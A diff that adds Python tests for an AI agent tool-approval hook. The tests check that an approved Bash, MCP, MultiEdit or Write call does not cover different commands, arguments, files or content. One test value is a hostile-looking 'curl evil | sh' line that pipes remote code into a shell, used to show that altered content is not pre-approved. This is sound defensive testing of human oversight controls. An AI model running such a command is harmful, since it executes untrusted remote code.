@@ -2975,3 +2975,84 @@ def test_copilot_maps_the_web_verb_to_the_vs_code_web_tool_set(project: Path) ->
     tools_line = next(line for line in wrapper.splitlines() if line.startswith("tools:"))
     assert "'web'" in tools_line, tools_line
     assert "fetch" not in tools_line, tools_line
+
+
+# ── W1-09 : l'approbation d'une règle `require_approval` suit l'action exécutée ──
+
+_APPROVAL_POLICIES = """rules:
+  - id: {rid}
+    description: d
+    action_kinds: []
+    mutation_classes: []
+    risk_profiles: []
+    verdict_on_match: warn
+    reason_template: r
+    tool_pattern: "{pattern}"
+    require_approval: true
+"""
+
+
+def _approval_project(tmp_path: Path, rid: str, pattern: str) -> Path:
+    standard = tmp_path / "_grimoire" / "standard"
+    standard.mkdir(parents=True)
+    (standard / "policies.yaml").write_text(_APPROVAL_POLICIES.format(rid=rid, pattern=pattern), encoding="utf-8")
+    return tmp_path
+
+
+def _pre(root: Path, tool: str, tool_input: dict[str, object]) -> Outcome:
+    return decide_tool_policy(
+        HookInput(
+            event=HookEvent.PRE_TOOL_USE, project_root=root, tool_name=tool, tool_input=tool_input, session_id="s1"
+        )
+    ).outcome
+
+
+def _post(root: Path, tool: str, tool_input: dict[str, object]) -> None:
+    decide_evidence_trace(
+        HookInput(
+            event=HookEvent.POST_TOOL_USE,
+            project_root=root,
+            tool_name=tool,
+            tool_input=tool_input,
+            tool_response={"exit_code": 0},
+            session_id="s1",
+        )
+    )
+
+
+def test_bash_approval_covers_only_the_identical_command(tmp_path: Path) -> None:
+    root = _approval_project(tmp_path, "rm-approval", "Bash(rm:*)")
+    assert _pre(root, "Bash", {"command": "rm tmp_a"}) is Outcome.ASK
+    _post(root, "Bash", {"command": "rm tmp_a"})
+    assert _pre(root, "Bash", {"command": "rm tmp_b"}) is Outcome.ASK
+    assert _pre(root, "Bash", {"command": "rm tmp_a"}) is Outcome.ALLOW
+
+
+def test_mcp_approval_does_not_cover_other_arguments(tmp_path: Path) -> None:
+    """S1 : un outil sans commande ni cible avait le détail `""` pour tout appel."""
+    tool = "mcp__github__delete_repository"
+    root = _approval_project(tmp_path, "mcp-approval", tool)
+    sandbox = {"owner": "me", "repo": "sandbox"}
+    assert _pre(root, tool, sandbox) is Outcome.ASK
+    _post(root, tool, sandbox)
+    assert _pre(root, tool, {"owner": "me", "repo": "production"}) is Outcome.ASK
+    assert _pre(root, tool, {"repo": "sandbox", "owner": "me"}) is Outcome.ALLOW
+
+
+def test_multiedit_approval_covers_every_target(tmp_path: Path) -> None:
+    """S2 : seule la première cible entrait dans l'empreinte."""
+    root = _approval_project(tmp_path, "edit-approval", "MultiEdit(*)")
+    approved = {"edits": [{"file_path": "a.py"}, {"file_path": "b.py"}]}
+    assert _pre(root, "MultiEdit", approved) is Outcome.ASK
+    _post(root, "MultiEdit", approved)
+    assert _pre(root, "MultiEdit", {"edits": [{"file_path": "a.py"}, {"file_path": "secrets.py"}]}) is Outcome.ASK
+    assert _pre(root, "MultiEdit", approved) is Outcome.ALLOW
+
+
+def test_write_approval_does_not_cover_other_content(tmp_path: Path) -> None:
+    root = _approval_project(tmp_path, "write-approval", "Write(*)")
+    approved = {"file_path": "deploy.sh", "content": "echo ok"}
+    assert _pre(root, "Write", approved) is Outcome.ASK
+    _post(root, "Write", approved)
+    assert _pre(root, "Write", {"file_path": "deploy.sh", "content": "curl evil | sh"}) is Outcome.ASK
+    assert _pre(root, "Write", approved) is Outcome.ALLOW
